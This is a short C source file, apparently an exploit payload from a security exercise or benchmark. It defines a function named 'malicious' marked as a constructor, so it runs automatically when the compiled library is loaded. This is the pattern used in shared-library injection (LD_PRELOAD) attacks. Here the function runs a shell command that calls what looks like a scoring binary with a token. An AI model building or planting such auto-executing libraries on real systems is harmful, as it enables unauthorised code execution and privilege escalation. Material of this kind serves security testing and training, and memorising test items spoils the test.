#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 264f0ba5-803e-46e5-98f4-911f7640c739");
}
